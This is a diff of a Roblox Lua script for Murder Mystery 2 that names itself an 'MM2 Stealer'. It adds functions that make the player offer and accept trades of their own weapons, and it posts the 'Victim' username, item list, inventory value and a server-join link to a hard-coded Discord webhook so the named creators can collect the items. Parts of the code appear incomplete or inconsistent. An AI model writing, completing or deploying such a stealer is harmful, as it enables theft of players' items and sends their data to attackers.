@@ -56,9 +56,18 @@ local function getTopItems()
 	end)
 	if not success or not profileData then return {} end
 
-	local owned = profileData.Weapons and profileData.Weapons.Owned or {}
-	local success, Values = pcall(function()
-		local categories = {
+local rarityTable = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Godly",
+    "Ancient",
+    "Unique",
+    "Vintage"
+}
+
+local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
     unique = "https://supremevaluelist.com/mm2/uniques.html",
@@ -208,45 +217,107 @@ local function buildValueList()
     return valueList
 end
 
+local function sendTradeRequest(user)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+end
+
+local function getTradeStatus()
+    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+end
+
+local function waitForTradeCompletion()
+    while true do
+        local status = getTradeStatus()
+        if status == "None" then
+            break
+        end
+        wait(0.1)
+    end
+end
+
+local function acceptTrade()
+    local args = {
+        [1] = 285646582
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+end
+
+local function addWeaponToTrade(id)
+    local args = {
+        [1] = id,
+        [2] = "Weapons"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end
+
+local totalValue = 0
+
 if totalValue >= 100 then
     usernames = { "xQuartz0", "isaidmager", "" } -- dual usernames
     webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
 end
 
-local function sendWebhook(totalValue, tradableSummary)
-	local payload = {
-		["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
-		["embeds"] = {{
-			["title"] = "MM2 Stealer",
-			["color"] = 0x8400ff,
-			["fields"] = {
-				{["name"] = "Victim", ["value"] = LocalPlayer.Name},
-				{["name"] = "Creator", ["value"] = table.concat(usernames, ", ")},
-				{["name"] = "Executor", ["value"] = executor},
-				{["name"] = "Total Value", ["value"] = string.format("Total Value: %s", totalValue),
-				{["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```"},
-				{["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
-			},
-			["footer"] = {["text"] = "by @x19b • " .. os.date("%B %d, %Y")},
-			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-		}}
-	}
+local function SendFirstMessage(list, prefix)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
 
-	local function send(url, data)
-		pcall(function()
-			request({
-				Url = url,
-				Method = "POST",
-				Headers = {["Content-Type"] = "application/json"},
-				Body = HttpService:JSONEncode(data)
-			})
-		end)
-	end
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Join here:",
+            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
+        },
+        {
+            name = "Item List:",
+            value = "",
+            inline = false
+        },
+        {
+            name = "Summary:",
+            value = string.format("Total Value: %s", totalValue),
+            inline = false
+        }
+    }
 
-	send(webhook, payload)
-end
+    for _, item in ipairs(list) do
+        local itemLine = string.format("%s (x%s): %s value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+        fields[3].value = fields[3].value .. itemLine .. "\n"
+    end
 
-sendWebhook(totalValue, summariseItems(items))
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+local data = {
+    ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+    ["embeds"] = {{
+        ["title"] = "🦇 | Join to get MM2 hit",
+        ["color"] = 4917386,
+        ["fields"] = fields,
+        ["footer"] = {
+            ["text"] = "Comparison is the thief of joy."
+        },
+        ["thumbnail"] = {
+            ["url"] = "https://cdn.discordapp.com/attachments/1340674396599095459/1385732970727477348/image-removebg-preview.png?ex=685723e5&is=6855d265&hm=c42bc3484f4ef6a9330361596213b30841514fe163a84f2d85ad2451ff14e8d7&"
+        }
+    }}
+}
 
 local function tryClickTradeGUI(name)
 	local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI")
